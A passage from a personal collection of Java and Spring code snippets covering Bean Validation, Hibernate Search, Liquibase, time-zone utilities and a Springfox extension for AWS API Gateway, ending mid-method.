          System.out.println("No violations.");
      } else {
          System.out.printf("%s violations:%n", violations.size());
          violations.stream()
                    .forEach(ConvertGroupExample::printError);
      }
  }
  
  public static Validator createValidator() {
      Configuration<?> config = Validation.byDefaultProvider().configure();
      ValidatorFactory factory = config.buildValidatorFactory();
      Validator validator = factory.getValidator();
      factory.close();
      return validator;
  }
  
public class DriverLicense {
  @NotNull
  @Valid
  @ConvertGroup(from = LicenceNumberCheck.class,
          to = DriverPhysicalRequirement.class)
  private Driver driver;
  @Digits(integer = 7, fraction = 0, groups = LicenceNumberCheck.class)
  private int number;

  public DriverLicense(Driver driver, int number) {
      this.driver = driver;
      this.number = number;
  }
}

public class Driver {
  @NotNull
  private String fullName;
  @Min(value = 100, groups = DriverPhysicalRequirement.class)
  private int height;
  @Past(groups = DriverPhysicalRequirement.class)
  @NotNull
  private Date dateOfBirth;

  public Driver(String fullName, int height, Date dateOfBirth) {
      this.dateOfBirth = dateOfBirth;
      this.fullName = fullName;
      this.height = height;
  }
}
-------------------------------------------------------------------------------------------------------
# Настройка сервера на запуск с SSL/TLS и использования HTTPS
server.port = 8443
server.ssl.key-store = classpath:tomcat.keystore
server.ssl.key-store-password = password
server.ssl.key-password = password
-------------------------------------------------------------------------------------------------------
import javax.annotation.security.RolesAllowed;
import javax.ejb.Stateless;
import javax.ejb.TransactionAttribute;
import javax.ejb.TransactionAttributeType;
import javax.annotation.security.PermitAll;
import javax.annotation.security.RolesAllowed;
import javax.ejb.Remote;
import org.jboss.annotation.security.SecurityDomain;
import org.jboss.annotation.security.SecurityDomain;

@Stateless
@SecurityDomain("other")
@Remote(Calculator.class)
public class CalculatorBean implements Calculator
{
   @PermitAll
   @TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)
   public int add(int x, int y)
   {
      return x + y;
   }

   @RolesAllowed({"student"})
   public int subtract(int x, int y)
   {
      return x - y;
   }

   @RolesAllowed({"teacher"})
   public int divide(int x, int y)
   {
      return x / y;
   }
}
-------------------------------------------------------------------------------------------------------
    <properties>
      <property name="hibernate.dialect" value="org.hibernate.dialect.HSQLDialect"/>
      <property name="hibernate.hbm2ddl.auto" value="update"/>
      <property name="hibernate.connection.driver_class" value="org.hsqldb.jdbcDriver"/>
      <property name="hibernate.connection.username" value="sa"/>
      <property name="hibernate.connection.password" value=""/>
      <property name="hibernate.connection.url" value="jdbc:hsqldb:data/tutorial"/>
    </properties>
-------------------------------------------------------------------------------------------------------
@Entity
@Table(name="PERSON_HIERARCHY")
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="DISCRIMINATOR",
                     discriminatorType=DiscriminatorType.STRING)
@DiscriminatorValue("PERSON")
class Person implements java.io.Serializable
{
   private int id;
   private String firstName;
   private String lastName;

   @Id @GeneratedValue
   public int getId() { return id; }
   public void setId(int id) { this.id = id; }

   public String getFirstName() { return firstName; }
   public void setFirstName(String first) { this.firstName = first; }

   public String getLastName() { return lastName; }
   public void setLastName(String last) { this.lastName = last; }
}
-------------------------------------------------------------------------------------------------------
public static Map<Object, Object> convertToMap(final String filePath) {

	// creating the properties object
	Properties properties = new Properties();

	// declaring the map object
	Map<Object, Object> propertyMap  = null;
	
	// creating file object
	File file = new File(filePath);

	FileReader fr = null;
	
	try {
		
		fr = new FileReader(file);

		properties.load(fr);
		
		propertyMap = new HashMap<Object, Object>(properties);

	} catch (FileNotFoundException e) {
		
		System.out.println(e.getMessage());
		e.printStackTrace();
		
	} catch (IOException e) {

		System.out.println(e.getMessage());
		e.printStackTrace();
	}
	
	return propertyMap;
}
-------------------------------------------------------------------------------------------------------
@Controller
public class LibraryController {
	
	public static final int USERS_PER_PAGE = 20;
	
	@Autowired
	LibraryUserDetailService userService;
  
  	@GetMapping("/admin-panel")
	public String showAdminPanel(	@RequestParam(value="search", required=false) String searchText,
					@RequestParam(value="pageNo", required=false) Integer pageNo,
					ModelMap model){
		
			if (searchText == null && pageNo == null) {
				return "admin-panel";
			}
			
			if (searchText != null && pageNo == null){
				pageNo = 1;
				model.put("pageNo", 1);
			}
			
			model.addAttribute("resultsCount", userService.searchUsersResultsCount(searchText));
			
			model.addAttribute("pageCount", userService.searchUserPagesCount(searchText, USERS_PER_PAGE));
			
			model.addAttribute("userList", userService.searchUsers(searchText, pageNo, USERS_PER_PAGE));
			return "admin-panel";
	}
https://habr.com/ru/company/rostelecom/blog/428578/
https://medium.com/@wkrzywiec/full-text-search-with-hibernate-search-lucene-part-1-e245b889aa8e

<!-- Configuration of Hibernate Session -->
   <bean id="sessionFactory"
      class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">

      <property name="dataSource" ref="dataSource" />
      <property name="packagesToScan" value="de.user.server.model" />
      <property name="hibernateProperties">
         <props>
            <prop key="hibernate.hbm2ddl.auto">update</prop>
            <prop key="hibernate.show_sql">${jdbc.debug}</prop>
            <prop key="hibernate.format_sql">true</prop>
            <prop key="hibernate.id.new_generator_mappings">true</prop>
            <prop key="hibernate.dialect">${jdbc.dialect}</prop>
            <prop key="hibernate.jdbc.batch_size">0</prop>
            <prop key="hibernate.hbm2ddl.import_files">import.sql</prop>
            <prop key="hibernate.c3p0.idle_test_period">28680</prop>
            <prop key="hibernate.search.default.directory_provider">filesystem</prop>
            <prop key="hibernate.search.default.indexBase">H:/indexes</prop>

         </props>
      </property>

<!-- hibernate-envers for versioning of entities -->
      <property name="eventListeners">
         <map>
            <entry key="post-insert" value-ref="envers" />
            <entry key="post-update" value-ref="envers" />
            <entry key="post-delete" value-ref="envers" />
            <entry key="pre-collection-update" value-ref="envers" />
            <entry key="pre-collection-remove" value-ref="envers" />
            <entry key="post-collection-recreate" value-ref="envers" />
         </map>
      </property>
   </bean>
   
   
@Entity
@Indexed
@Connectable(modelClass = ModelClassEnum.TEXT)
public class Text extends AbstractDataObject {

    /**
     * Value generated automatically by eclipse.
     */
    private static final long serialVersionUID = 8096234710520978913L;

    private String text;

    public Text() {

    }    

    @Lob
    @Field (name="text",index=Index.YES, analyze=Analyze.YES,store=Store.YES)
    public String getText() {
        return this.text;
    }

public void setText(String text) {
        this.text = text;       
    }
}


import com.mkyong.model.BaseballCard;
import org.apache.lucene.search.Query;
import org.hibernate.search.jpa.FullTextEntityManager;
import org.hibernate.search.jpa.Search;
import org.hibernate.search.query.dsl.QueryBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.persistence.EntityManager;
import javax.persistence.NoResultException;
import java.util.List;

@Service
public class HibernateSearchService {


    @Autowired
    private final EntityManager centityManager;


    @Autowired
    public HibernateSearchService(EntityManager entityManager) {
        super();
        this.centityManager = entityManager;
    }


    public void initializeHibernateSearch() {

        try {
            FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(centityManager);
            fullTextEntityManager.createIndexer().startAndWait();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Transactional
    public List<BaseballCard> fuzzySearch(String searchTerm) {

        FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(centityManager);
        QueryBuilder qb = fullTextEntityManager.getSearchFactory().buildQueryBuilder().forEntity(BaseballCard.class).get();
        Query luceneQuery = qb.keyword().fuzzy().withEditDistanceUpTo(1).withPrefixLength(1).onFields("name")
                .matching(searchTerm).createQuery();

        javax.persistence.Query jpaQuery = fullTextEntityManager.createFullTextQuery(luceneQuery, BaseballCard.class);

        // execute search

        List<BaseballCard> BaseballCardList = null;
        try {
            BaseballCardList = jpaQuery.getResultList();
        } catch (NoResultException nre) {
            ;// do nothing

        }

        return BaseballCardList;


    }
}


import javax.persistence.EntityManager;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import com.mkyong.service.HibernateSearchService;
@EnableAutoConfiguration 
@Configuration
public class HibernateSearchConfiguration {

	@Autowired
	private EntityManager bentityManager;

	@Bean
	HibernateSearchService hibernateSearchService() {
		HibernateSearchService hibernateSearchService = new HibernateSearchService(bentityManager);
		hibernateSearchService.initializeHibernateSearch();
		return hibernateSearchService;
	}
}


    @Autowired
    private HibernateSearchService searchservice;
	
	
	import com.mkyong.model.BaseballCard;
import com.mkyong.service.CardService;
import com.mkyong.service.HibernateSearchService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.List;

@Controller
public class CardController {

    @Autowired
    private HibernateSearchService searchservice;

    @Autowired
    private CardService cardservice;

    @RequestMapping(value = "/", method = RequestMethod.GET)
    public String search(@RequestParam(value = "search", required = false) String q, Model model) {
        List<BaseballCard> searchResults = null;
        try {
            cardservice.addCards();
            searchResults = searchservice.fuzzySearch(q);

        } catch (Exception ex) {
            // here you should handle unexpected errors
            // ...
            // throw ex;
        }
        model.addAttribute("search", searchResults);
        return "index";

    }

}
-------------------------------------------------------------------------------------------------------
        UriComponentsBuilder bc = UriComponentsBuilder.newInstance();
        HttpHeaders headers = new HttpHeaders();
        headers.setLocation(ucBuilder.path(request.getRequestURI() + "/{id}").buildAndExpand(userDto.getId()).toUri());
        return new ResponseEntity<>(headers, HttpStatus.CREATED);
-------------------------------------------------------------------------------------------------------
import java.util.Objects;
import java.util.UUID;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

/**
 *
 * UID constraint validation implementation
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
public class UIDConstraintValidator implements ConstraintValidator<UID, UUID> {

    public static final String DEFAULT_FORMAT = "\\p{XDigit}{8}-\\p{XDigit}{4}-\\p{XDigit}{4}-\\p{XDigit}{4}-\\p{XDigit}{12}";

    @Override
    public void initialize(final UID uid) {
    }

    @Override
    public boolean isValid(final UUID uidField, final ConstraintValidatorContext cxt) {
        if (Objects.isNull(uidField)) {
            return false;
        }
        boolean isValid = uidField.toString().matches(DEFAULT_FORMAT);
        if (!isValid) {
            cxt.disableDefaultConstraintViolation();
            cxt.buildConstraintViolationWithTemplate(String.format("ERROR: incorrect uid={%s} (expected format={%s})", uidField, UIDConstraintValidator.DEFAULT_FORMAT)).addConstraintViolation();
        }
        return isValid;
    }
}


import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;
import javax.validation.constraints.Pattern;

/**
 *
 * UID constraint annotation
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Documented
@Constraint(validatedBy = UIDConstraintValidator.class)
@Target({ElementType.METHOD, ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
//@Pattern(regexp = UIDConstraintValidator.DEFAULT_FORMAT, message = "Invalid UID format")
public @interface UID {

    //public String value() default "";
    public String message() default "{Default UID format: xxxx-xxxx-xxxx-xxxx}";
    public Class<?>[] groups() default {};
    public Class<? extends Payload>[] payload() default {};
}
-------------------------------------------------------------------------------------------------------
@ZipCodeCoherenceChecker(groups = Address.HighLevelCoherence.class)
public class Address {
    @NotNull @Size(max = 50)
    private String street1;

    @NotNull @ZipCode
    private String zipCode;

    @NotNull @Size(max = 30)
    private String city;

    /**
     * check coherence on the overall object
     * Needs basic checking to be green first
     */
    public interface HighLevelCoherence {}

    /**
     * check both basic constraints and high level ones.
     * high level constraints are not checked if basic constraints fail
     */
    @GroupSequence({Default.class, HighLevelCoherence.class})
    public interface Complete {}
}

@GroupSequence({Address.class, HighLevelCoherence.class})
@ZipCodeCoherenceChecker(groups = Address.HighLevelCoherence.class)
public class Address {
    @NotNull @Size(max = 50)
    private String street1;

    @NotNull @ZipCode
    private String zipCode;

    @NotNull @Size(max = 30)
    private String city;

    /**
     * check coherence on the overall object
     * Needs basic checking to be green first
     */
    public interface HighLevelCoherence {}
}

alpha-0277-1c062e5
-------------------------------------------------------------------------------------------------------
@JsonProperty
@Field(store = Store.YES, index = Index.UN_TOKENIZED)
@DateBridge(resolution = Resolution.SECOND)
@Column(nullable = false, updatable = false)
public Date getCreateDate() {
	return createDate;
}

@Field(store = Store.YES, index = Index.NO)
@Min(0)
@Digits(integer = 12, fraction = 3)
@Column(nullable = false, precision = 21, scale = 6)
public BigDecimal getMarketPrice() {
	return marketPrice;
}
@Field(store = Store.YES, index = Index.UN_TOKENIZED)
@NumericField
@Column(nullable = false, precision = 12, scale = 6)
public Float getScore() {
	return score;
}
@Fields({
    @Field(index = Index.YES, analyze = Analyze.YES, store = Store.NO),
    @Field(name = "keySort", index = Index.YES, analyze = Analyze.NO, store = Store.NO)
})
@Override
public String getKey() {
  return key;
}
/**
 * Returns the alternate terminology ids.
 *
 * @return the alternate terminology ids
 */
/* see superclass */
@Override
@FieldBridge(impl = MapKeyValueToCsvBridge.class)
@Field(name = "alternateTerminologyIds", index = Index.YES, analyze = Analyze.YES, store = Store.NO)
public Map<String, String> getAlternateTerminologyIds() {
  if (alternateTerminologyIds == null) {
    alternateTerminologyIds = new HashMap<>(2);
  }
  return alternateTerminologyIds;
}
@XmlJavaTypeAdapter(UserRoleMapAdapter.class)
@Fields({
    @Field(bridge = @FieldBridge(impl = UserRoleBridge.class), index = Index.YES, analyze = Analyze.YES, store = Store.NO),
    @Field(name = "userAnyRole", bridge = @FieldBridge(impl = UserMapUserNameBridge.class), index = Index.YES, analyze = Analyze.YES, store = Store.NO)
})
@Override
public Map<User, UserRole> getUserRoleMap() {
  if (userRoleMap == null) {
    userRoleMap = new HashMap<>();
  }
  return userRoleMap;
}
@Type(type = "org.openyu.commons.entity.usertype.AuditEntityUserType")
@Column(name = "audit", length = 570)
@Field(store = Store.YES, index = Index.YES, analyze = Analyze.NO)
@FieldBridge(impl = AuditEntityBridge.class)
public AuditEntity getAudit()
{
	return audit;
}
-------------------------------------------------------------------------------------------------------

import com.joe.easysocket.server.ext.mvc.Bean;
import com.joe.easysocket.server.ext.mvc.context.RequestContext;
import com.joe.easysocket.server.ext.mvc.exception.ResourceInvokeException;
import lombok.Data;

import javax.validation.ConstraintViolation;
import javax.validation.Validation;
import javax.validation.ValidationException;
import javax.validation.Validator;
import javax.validation.executable.ExecutableValidator;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Set;

/**
 * 资源接口
 *
 * @author joe
 */
@Data
public class Resource<T> implements Bean {
    private static final Validator validator = Validation.buildDefaultValidatorFactory().getValidator();
    private static final ExecutableValidator executableValidator = validator.forExecutables();
    // 该资源对应的实体类
    private Class<T> resourceClass;
    // 该资源对应的方法
    private Method resourceMethod;
    // 该资源的访问路径，格式是/aa/bb，以/开头
    private String name;
    // 访问该资源需要的参数
    private List<Param<?>> params;
    private T instance;
    // 响应数据格式
    private String produce;
    // 接收数据格式
    private String consume;

    /**
     * 调用资源
     *
     * @param requestContext 请求上线文
     * @return 调用结果
     * @throws ResourceInvokeException 资源调用异常
     */
    public Object invoke(RequestContext requestContext) throws ResourceInvokeException {
        try {
            return resourceMethod.invoke(instance, requestContext.getParams());
        } catch (Throwable e) {
            throw new ResourceInvokeException(e);
        }
    }

    /**
     * 检查参数是否符合注解（用户自行加的验证注解）
     *
     * @param params 参数
     * @throws ValidationException 当参数不符合规定时抛出该异常
     */
    public void check(Object[] params) throws ValidationException {
        Set<ConstraintViolation<T>> methodValidators = executableValidator.validateParameters(instance,
                resourceMethod, params);
        for (ConstraintViolation<T> constraintViolation : methodValidators) {
            throw new ValidationException(constraintViolation.getMessage());
        }
    }
}
-------------------------------------------------------------------------------------------------------
mvn compile exec:java -Dexec.mainClass=com.mastertheboss.jpa.JpaTest
-------------------------------------------------------------------------------------------------------
public List<Etude> search(String text, Map<String, String> allParams) {
        text = stripAccents(text);
        // get the full text entity manager
        FullTextEntityManager fullTextEntityManager = getFullTextEntityManager(entityManager);

        // create the query using Hibernate Search query DSL
        QueryBuilder queryBuilder = fullTextEntityManager
                .getSearchFactory()
                .buildQueryBuilder()
                .forEntity(Etude.class)
                .get();

        // Simple Query String queries
        Query query = queryBuilder
                .simpleQueryString()
                .onFields("n0Cet")
                .andField("anneeCet")
                .andField("noDansAnneeCet")
                .andField("sigleEtude")
                .andField("titreEtude")
                .andField("traitement1")
                .andField("traitement2")
                .andField("traitement3")
                .andField("traitement4")
                .andField("traitement5")
                .andField("demandeurIgr.nomInvestigateurIgr")
                .andField("investigateurHorsIgr.nomInvestigateur")
                .andField("investigateurIgr.nomInvestigateurIgr")
                .andField("promoteur.nomPromoteur")
                .matching(text)
                .createQuery();

        // wrap Lucene query in an Hibernate Query object
        FullTextQuery fullTextQuery = fullTextEntityManager
                .createFullTextQuery(query, Etude.class)
                .setMaxResults(101);

        // Here allParams contains
        // avisDefinitifCet => 'acceptation',
        // clasCet1ErPassage => 'acceptation'
        allParams.forEach((key, value) -> {
            fullTextQuery.enableFullTextFilter("etudeFilter").setParameter(key, value);
        });

        return (List<Etude>) fullTextQuery.getResultList();
    }
-------------------------------------------------------------------------------------------------------
DateTimeFormatter.ISO_INSTANT.format(Instant.now().truncatedTo(ChronoUnit.SECONDS))
-------------------------------------------------------------------------------------------------------
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.AbstractMap.SimpleEntry;
import java.util.Map;

public class DisplayZoneAndOffSet2 {

    public static final boolean SORT_BY_REGION = false;

    public static void main(String[] args) {

        LocalDateTime localDateTime = LocalDateTime.now();

        long total = ZoneId.getAvailableZoneIds()
                .stream()
                .map(ZoneId::of)
                .map(zoneId -> new SimpleEntry<>(zoneId.toString(), localDateTime.atZone(zoneId)
                        .getOffset()
                        .getId()
                        .replaceAll("Z", "+00:00")))
                .sorted(SORT_BY_REGION
                        ? Map.Entry.comparingByKey()
                        : Map.Entry.<String, String>comparingByValue().reversed())
                .peek(e -> System.out.printf(String.format("%35s (UTC%s) %n", e.getKey(), e.getValue())))
                .count();

        System.out.println("\nTotal Zone IDs " + total);

    }
}

import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.AbstractMap.SimpleEntry;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.stream.Collectors;

public class DisplayZoneAndOffSet3 {

    public static final boolean SORT_BY_REGION = false;

    public static void main(String[] args) {

        LocalDateTime localDateTime = LocalDateTime.now();

        Map<String, String> result = ZoneId.getAvailableZoneIds()
                .stream()
                .map(ZoneId::of)
                .map(zoneId -> new SimpleEntry<>(zoneId.toString(), localDateTime.atZone(zoneId)
                        .getOffset()
                        .getId()
                        .replaceAll("Z", "+00:00")))
                .sorted(SORT_BY_REGION
                        ? Map.Entry.comparingByKey()
                        : Map.Entry.<String, String>comparingByValue().reversed())
                .collect(Collectors.toMap(
                        SimpleEntry::getKey,
                        SimpleEntry::getValue,
                        (oldValue, newValue) -> oldValue,
                        LinkedHashMap::new));

        result.forEach((k, v) -> System.out.printf(String.format("%35s (UTC%s) %n", k, v)));

        System.out.println("\nTotal Zone IDs " + result.size());

    }
}
-------------------------------------------------------------------------------------------------------
@Pattern(regexp = "[0-9]*")
@Size
@Constraint(validatedBy = FrenchZipCodeValidator.class)
@Documented
@Target({ METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE })
@Retention(RUNTIME)
public @interface FrenchZipCode {

    String message() default "Wrong zip code";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    @OverridesAttribute(constraint = Size.class, name = "min")
    @OverridesAttribute(constraint = Size.class, name = "max")
    int size() default 5;

    @OverridesAttribute(constraint = Size.class, name = "message")
    String sizeMessage() default "{com.acme.constraint.FrenchZipCode.zipCode.size}";

    @OverridesAttribute(constraint = Pattern.class, name = "message")
    String numberMessage() default "{com.acme.constraint.FrenchZipCode.number.size}";

    @Target({ METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE })
    @Retention(RUNTIME)
    @Documented
    @interface List {

        FrenchZipCode[] value();
    }
}
-------------------------------------------------------------------------------------------------------
public static<T> Stream<T> flatten(T[] a, T[] b)
	{
		Stream<T> stream = Stream.of(a, b)
				.flatMap(Arrays::stream);

		return stream;
	}
	1570719030
-------------------------------------------------------------------------------------------------------
List<Map<String, Object>> expensive = JsonPath.parse(jsonDataSourceString)
  .read("$['book'][?(@['price'] > $['price range']['medium'])]");
predicateUsageAssertionHelper(expensive);

bject dataObject = JsonPath.parse(jsonString).read("$[?(@.id == 2)]");
String dataString = dataObject.toString();
-------------------------------------------------------------------------------------------------------
npm install -g snyk
cd ~/projects/my-project/
snyk monitor
-------------------------------------------------------------------------------------------------------
cd c:/mychangelogs/
liquibase --url=jdbc:mysql://localhost:3306/liquiblog --driver=com.mysql.jdbc.Driver --username=root --password="" --changeLogFile=db.changelog-0.1.0.xml update
-------------------------------------------------------------------------------------------------------
@Bean
public SpringLiquibase liquibase() {
    SpringLiquibase liquibase = new SpringLiquibase();
    liquibase.setChangeLog("classpath:liquibase-changeLog.xml");
    liquibase.setDataSource(dataSource());
    return liquibase;
}
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.liquibase</groupId>
    <artifactId>liquibase-maven-plugin</artifactId>
    <version>3.4.1</version>
</dependency> 
...
<plugins>
    <plugin>
        <groupId>org.liquibase</groupId>
        <artifactId>liquibase-maven-plugin</artifactId>
        <version>3.4.1</version>
        <configuration>                  
            <propertyFile>src/main/resources/liquibase.properties</propertyFile>
        </configuration>                
    </plugin> 
</plugins>

mvn liquibase:generateChangeLog

url=jdbc:mysql://localhost:3306/oauth_reddit
username=tutorialuser
password=tutorialmy5ql
driver=com.mysql.jdbc.Driver
outputChangeLogFile=src/main/resources/liquibase-outputChangeLog.xml

mvn liquibase:diff
changeLogFile=src/main/resources/liquibase-changeLog.xml
url=jdbc:mysql://localhost:3306/oauth_reddit
username=tutorialuser
password=tutorialmy5ql
driver=com.mysql.jdbc.Driver
referenceUrl=jdbc:h2:mem:oauth_reddit
diffChangeLogFile=src/main/resources/liquibase-diff-changeLog.xml
referenceDriver=org.h2.Driver
referenceUsername=sa
referencePassword=


<plugins>
    <plugin>
        <groupId>org.liquibase</groupId>
        <artifactId>liquibase-maven-plugin</artifactId>
        <version>3.4.1</version>
        <configuration>                  
            <propertyFile>src/main/resources/liquibase.properties</propertyFile>
        </configuration> 
        <dependencies>
            <dependency>
                <groupId>org.liquibase.ext</groupId>
                <artifactId>liquibase-hibernate4</artifactId>
                <version>3.5</version>
            </dependency>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-beans</artifactId>
                <version>4.1.7.RELEASE</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.data</groupId>
                <artifactId>spring-data-jpa</artifactId>
                <version>1.7.3.RELEASE</version>
            </dependency>
        </dependencies>               
    </plugin> 
</plugins>


changeLogFile=classpath:liquibase-changeLog.xml
url=jdbc:mysql://localhost:3306/oauth_reddit
username=tutorialuser
password=tutorialmy5ql
driver=com.mysql.jdbc.Driver
referenceUrl=hibernate:spring:org.baeldung.persistence.model
  ?dialect=org.hibernate.dialect.MySQLDialect
diffChangeLogFile=src/main/resources/liquibase-diff-changeLog.xml

https://www.baeldung.com/liquibase-refactor-schema-of-java-app
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.hibernate.orm</groupId>
    <artifactId>hibernate-hikaricp</artifactId>
    <version>6.0.0.Alpha2</version>
</dependency>
-------------------------------------------------------------------------------------------------------
    private static Optional<Integer> resolve( String string ) {
        try {
            return Optional.of( Integer.valueOf( string ) );
        }
        catch ( NumberFormatException e )
        {
            System.out.println( '"' + string + '"' + " is not an integer");
            return Optional.empty();
        }
    }
-------------------------------------------------------------------------------------------------------
./gradlew releaseDocs
./gradlew clean build bintrayUpload -PreleaseType=<MAJOR|MINOR|PATCH>
 --stacktrace
 
 ./gradlew publishSnapshot
     ./gradlew release -PreleaseType=<MAJOR|MINOR|PATCH> -i
    ./gradlew publishDocs
-------------------------------------------------------------------------------------------------------
  //Here is an example where we select any api that matches one of these paths
  private Predicate<String> paths() {
    return or(
        regex("/business.*"),
        regex("/some.*"),
        regex("/contacts.*"),
        regex("/pet.*"),
        regex("/springsRestController.*"),
        regex("/test.*"));
  }
-------------------------------------------------------------------------------------------------------
// if com.qualified.ReplaceWith is not a Class that can be created using Class.forName(...)
// Original will be replaced with the new class
@ApiModelProperty(dataType = "com.qualified.ReplacedWith")
public Original getOriginal() { ... }

// if ReplaceWith is not a Class that can be created using Class.forName(...) Original will be preserved
@ApiModelProperty(dataType = "ReplaceWith")
public Original getAnotherOriginal() { ... }
-------------------------------------------------------------------------------------------------------
import static com.google.common.base.Strings.isNullOrEmpty;

import java.util.ArrayList;
import java.util.List;

import org.springframework.core.MethodParameter;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.method.HandlerMethod;

import com.google.common.base.Optional;

import io.swagger.annotations.ApiImplicitParam;
import io.swagger.annotations.ApiImplicitParams;
import io.swagger.annotations.ApiOperation;
import io.swagger.annotations.ApiParam;
import io.swagger.annotations.ApiResponse;
import io.swagger.annotations.ApiResponses;
import springfox.documentation.service.ObjectVendorExtension;
import springfox.documentation.service.StringVendorExtension;
import springfox.documentation.service.VendorExtension;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spi.service.OperationBuilderPlugin;
import springfox.documentation.spi.service.contexts.OperationContext;
import springfox.documentation.swagger.annotations.Annotations;
import springfox.documentation.swagger.common.SwaggerPluginSupport;

@Component
@Order(SwaggerPluginSupport.SWAGGER_PLUGIN_ORDER)
public class CustomAwsExtensionsReader implements OperationBuilderPlugin {

	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION = "x-amazon-apigateway-integration";
	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION_TYPE = "type";
	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION_HTTPMETHOD = "httpMethod";
	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION_URI = "uri";
	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION_REQUEST_PARAMS = "requestParameters";
	private static final String AWS_X_AMAZON_APIGATEWAY_INTEGRATION_REQUEST_RESPONSES = "responses";


	@Override
	public void apply(OperationContext context) {

		HandlerMethod handlerMethod = context.getHandlerMethod();
		Optional<ApiOperation> apiOperationOperational = Annotations
				.findApiOperationAnnotation(handlerMethod.getMethod());
		String awsApiGatewayBaseUri  = "";//Fetch it from DB/Service
		
		if (apiOperationOperational.isPresent()) {
			ApiOperation apiOperation = apiOperationOperational.get();
			ObjectVendorExtension extension = new ObjectVendorExtension(
					ensurePrefixed(AWS_X_AMAZON_APIGATEWAY_INTEGRATION));
			extension.addProperty(new StringVendorExtension(AWS_X_AMAZON_APIGATEWAY_INTEGRATION_TYPE, "http"));
			extension.addProperty(new StringVendorExtension(AWS_X_AMAZON_APIGATEWAY_INTEGRATION_HTTPMETHOD, apiOperation.httpMethod()));
			extension.addProperty(new StringVendorExtension(AWS_X_AMAZON_APIGATEWAY_INTEGRATION_URI, awsApiGatewayBaseUri + getRequestUri(handlerMethod)));

			ObjectVendorExtension requestParameters = new ObjectVendorExtension(AWS_X_AMAZON_APIGATEWAY_INTEGRATION_REQUEST_PARAMS);

			processApiParamAnnotation(requestParameters, handlerMethod);
			processApiImplicitParamsAnnotation(handlerMethod, requestParameters);

			ObjectVendorExtension awsResponses = new ObjectVendorExtension(AWS_X_AMAZON_APIGATEWAY_INTEGRATION_REQUEST_RESPONSES);
			processApiResponsesAnnotation( awsResponses,handlerMethod);

			if (requestParameters != null && requestParameters.getValue() != null
					&& requestParameters.getValue().size() > 0) {
				extension.addProperty(requestParameters);
			}
			if (awsResponses != null && awsResponses.getValue() != null
					&& awsResponses.getValue().size() > 0) {
				extension.addProperty(awsResponses);
			}
			
			List<VendorExtension> extensions = new ArrayList<VendorExtension>();
			extensions.add(extension);
			context.operationBuilder().extensions(extensions);

		}
	}

	private String getRequestUri(HandlerMethod handlerMethod){
		RequestMapping requestMapping = handlerMethod.getMethodAnnotation(RequestMapping.class);
		RequestMapping controllerRequestMapping = handlerMethod.getBeanType().getAnnotation(RequestMapping.class);
		String[] paths = requestMapping.path();
		String[] requestPaths = controllerRequestMapping.value();
		String requestUri = "";
		if (requestPaths != null && requestPaths.length > 0) {
			requestUri = requestPaths[0];
			if (paths != null && paths.length > 0) {
				requestUri = requestUri + paths[0];
			}
		}
		return requestUri;
	}
	private void processApiResponsesAnnotation(ObjectVendorExtension awsResponses,HandlerMethod handlerMethod) {
		Optional<ApiResponses> apiResponsesOptional = Annotations
				.findApiResponsesAnnotations(handlerMethod.getMethod());
		if (apiResponsesOptional.isPresent()) {
			ApiResponses apiResponses = apiResponsesOptional.get();
			ApiResponse[] apiResponseArray = apiResponses.value();
			for (ApiResponse apiResponse : apiResponseArray) {
				ObjectVendorExtension awsResponse = new ObjectVendorExtension(String.valueOf(apiResponse.code()));
				awsResponse
						.addProperty(new StringVendorExtension("statusCode", String.valueOf(apiResponse.code())));
				awsResponses.addProperty(awsResponse);
			}

		}
	}

	private void processApiImplicitParamsAnnotation(HandlerMethod handlerMethod,
			ObjectVendorExtension requestParameters) {
		ApiImplicitParams apiImplicitParams = handlerMethod.getMethodAnnotation(ApiImplicitParams.class);
		if (apiImplicitParams != null) {
			String requestParameterIntegration = "";
			String requestParameterMethod = "";
